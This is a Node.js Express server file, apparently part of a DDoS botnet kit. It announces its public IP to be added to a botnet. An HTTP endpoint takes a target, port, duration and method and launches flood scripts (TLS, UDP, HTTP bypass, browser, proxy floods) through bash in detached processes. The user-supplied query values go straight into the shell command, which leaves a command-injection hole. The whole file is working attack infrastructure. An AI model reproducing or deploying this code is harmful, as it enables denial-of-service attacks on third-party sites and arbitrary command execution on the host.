const express = require('express');
const { spawn } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

async function fetchData() {
    try {
        const response = await fetch('https://httpbin.org/get');
        const data = await response.json();
        console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
        return data;
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}

function generateCommand(target, port, time, methods) {
    switch (methods) {
        case 'pidoras':
            return `node ./lib/cache/pidoras.js ${target} ${time} 100 10 proxy.txt`;
        case 'glory':
            return `node ./lib/cache/glory.js ${target} ${time} 100 10 proxy.txt`;
        case 'quantum':
            return `node ./lib/cache/quantum.js ${target} ${time} 100 10 proxy.txt`;
        case 'fire':
            return `node ./lib/cache/fire.js ${target} ${time} 100 10 proxy.txt`;
        case 'httpsvip':
            return `node ./lib/cache/httpsvip.js ${target} ${time} 100 10 proxy.txt`;
        case 'tls':
            return `node ./lib/cache/tls.js ${target} ${time} 100 10 proxy.txt flood`;
        case 'httpx':
            return `node ./lib/cache/httpx.js ${target} ${time} 100 10 proxy.txt`;
        case 'uam':
            return `node ./lib/cache/uam.js ${target} ${time} 100 10 proxy.txt`;
        case 'bypass':
            return `node ./lib/cache/bypass.js ${target} ${time} 10 100 proxy.txt`;
        case 'https':
            return `node ./lib/cache/https.js ${target} ${time} 10 100 proxy.txt`;
        case 'stop':
            return `node ./lib/cache/stop.js ${target} ${time} 1 1 proxy.txt`;
        case 'cibi':
            return `node ./lib/cache/cibi.js ${target} ${time} 100 10 proxy.txt`;
        case 'flood':
            return `node ./lib/cache/flood.js ${target} ${time} 100 10 proxy.txt`;
        case 'raw':
            return `node ./lib/cache/raw.js ${target} ${time}`;
        case 'browser':
            return `node ./lib/cache/browser.js ${target} ${time} 10 100`;
        case 'udp':
            return `node ./lib/cache/udp.js ${target} ${port} ${time}`;
        case 'proxy':
            return `node ./lib/cache/scrape.js`;
        default:
            return null;
    }
}

app.get('/putraganteng', (req, res) => {
    // Parse URL untuk mengambil parameter query
    const queryObject = url.parse(req.url, true).query;
    const { target, port, time, methods } = queryObject;

    // Memberikan respon ke client
    res.status(200).json({
        status: 'Serangan PUTZXY90 Di Mulai.... ',
        target,
        port,
        time,
        methods
    });

    // Membuat command berdasarkan parameter yang diterima
    const command = generateCommand(target, port, time, methods);

    if (command) {
        // Menggunakan spawn untuk menjalankan perintah
        const process = spawn('bash', ['-c', command], { detached: true });

        // Mendengarkan aliran stdout dan stderr
        process.stdout.on('data', (data) => {
            console.log(`Stdout: ${data}`);
        });

        process.stderr.on('data', (data) => {
            console.error(`Stderr: ${data}`);
        });

        process.on('close', (code) => {
            console.log(`Proses keluar dengan kode ${code}`);
        });
    } else {
        console.log('Metode tidak valid diberikan.');
    }
});

// Menunggu request pada port yang ditentukan
app.listen(port, () => {
    fetchData();
});